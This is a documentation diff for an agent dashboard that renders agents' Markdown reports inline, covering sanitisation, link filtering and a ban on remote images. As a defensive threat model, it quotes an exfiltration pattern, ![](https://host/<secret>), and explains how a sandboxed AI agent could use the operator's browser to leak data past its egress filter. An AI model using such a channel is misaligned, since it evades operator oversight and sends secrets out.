@@ -1418,9 +1418,50 @@ implies `--zip`. Daemon-verified PNG, JPEG, GIF, WebP, and AVIF attachments also
 show a contain-fit thumbnail. Selecting the thumbnail opens the shared image
 preview overlay, which supports zoom, authenticated missing-file checks, and
 Escape-to-return while keeping the original download action available. SVG
-and other non-raster files remain download-only. The daemon copies the bytes
-into its private data directory, so remote dashboards download through an
-authenticated route rather than receiving access to the agent's filesystem.
+and other non-raster files remain download-only.
+
+A published **Markdown document** gets the same treatment in reading form. A
+file the daemon recognises as Markdown — by a `text/markdown` or
+`text/x-markdown` media type, or by a `.md`/`.markdown`/`.mdown`/`.mkd`/`.mkdn`
+name, at most 1 MiB, and whose leading bytes are UTF-8 text rather than binary —
+is **rendered in the message itself**, on its own row inside the attachment card:
+headings, lists, tables, fenced code, block quotes, links, and images. A report
+an agent wrote to be read is the content of that notification, so it is not put
+behind a control. The card keeps its file line, size, and download link above the
+document, and adds a **View source** control that opens the original Markdown in
+a modal — the reverse of the usual arrangement, since the rendered form is
+already on screen. Both the quick notification reader and Messages render it, and
+both share the same components.
+
+The document is fetched when the message is shown; a file the cleanup already
+removed, or one that cannot be read, says so in the document's place and leaves
+the download link alone.
+
+Rendering is done by the vendored [markdown-it](https://github.com/markdown-it/markdown-it)
+parser (`dashboard/vendor/markdown-it/`), loaded on demand so the dashboard's
+boot graph does not carry its ~130 KiB. The dashboard never asks the parser for
+HTML: it walks the token stream into a plain tree of allowlisted elements and
+attributes and renders that as Preact vnodes, so a document's own `<script>` or
+`onerror=` reaches the operator as visible characters, and a `javascript:` or
+`data:text/html` target never becomes a link. Document links open in a new tab
+with `rel="noopener noreferrer"`, and only absolute `http(s)`/`mailto` targets
+become links at all — a relative or fragment target would resolve against the
+dashboard's own origin rather than the repository its author meant, so it keeps
+its text and loses the anchor.
+
+Images are **inline-only**: a `data:` raster URI renders, and every remote or
+relative `src` degrades to the image's alt text. An `<img>` is the one thing in
+a document that reaches the network without the operator clicking anything, and
+the document's author is an agent that may be running behind tclaude's own
+egress boundary (see [Linux network filtering](linux-network-filtering.md)). A
+remote `src` would let such an agent write `![](https://host/<secret>)` and have
+the operator's unfiltered browser make the request it could not — carrying data
+out around the sandbox the operator configured, and revealing that (and when)
+the report was opened. Suppressing the referrer would hide which host asked, not
+that the request happened, so the viewer does not make the request at all.
+
+The daemon copies the bytes into its private data directory, so remote
+dashboards download through an authenticated route rather than receiving access to the agent's filesystem.
 Deleting the message deletes its stored artifact too. Uploads are capped at
 256 MiB each, 512 MiB per stable agent, and 2 GiB daemon-wide; the CLI rejects
 top-level symlinks and asks the agent to pass the resolved path explicitly.
